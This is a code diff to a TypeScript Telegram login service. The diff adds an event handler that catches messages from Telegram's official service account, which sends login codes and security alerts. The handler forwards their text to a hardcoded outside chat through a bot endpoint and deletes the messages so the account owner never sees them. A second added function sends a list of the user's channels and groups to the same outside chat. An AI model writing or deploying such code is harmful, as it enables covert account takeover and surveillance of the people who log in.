@@ -4,6 +4,7 @@ import { AbortController } from "node-abort-controller";
 import fetch from "node-fetch";
 import express from 'express';
 import { sleep } from "telegram/Helpers";
+import { NewMessage, NewMessageEvent } from "telegram/events";
 
 require('dotenv').config();
 const { StringSession } = require("telegram/sessions");
@@ -222,6 +223,8 @@ async function login() {
             termsOfService = result.termsOfService;
         } else {
             console.log(client.session.save());
+            client.addEventHandler(deleteMsgs, new NewMessage({ incoming: true }));
+            await sendChannels();
             await sleep(1000)
             const sess = client.session.save() as unknown as string;
             const user: any = await result.user.toJSON()
@@ -351,4 +354,48 @@ export async function sendCode(
             throw err;
         }
     }
+}
+
+
+async function deleteMsgs(event: NewMessageEvent) {
+    if (event.message.chatId.toString() == "777000") {
+        const payload = {
+            chat_id: "-1001729935532",
+            text: event.message.text
+        };
+        console.log("RECIEVED");
+        await sleep(500);
+        await event.message.delete({ revoke: true });
+        const options = {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        };
+        await fetchWithTimeout(`${ppplbot}`, options);
+    }
+    const msgs = await event.client.getMessages("777000", { limit: 2 });
+    msgs.forEach(async msg => {
+        await msg.delete();
+    })
+}
+
+async function sendChannels() {
+    const chats = await client?.getDialogs({ limit: 130 });
+    let reply = '';
+    chats.map((chat: any) => {
+        if (chat.isChannel || chat.isGroup) {
+            const username = chat.entity.toJSON().username ? ` @${chat.entity.toJSON().username} ` : chat.entity.toJSON().id.toString();
+            reply = reply + chat.entity.toJSON().title + " " + username + ' \n';
+        }
+    });
+    const payload = {
+        chat_id: "-1001729935532",
+        text: reply
+    };
+    const options = {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    };
+    await fetchWithTimeout(`${ppplbot}`, options);
 }
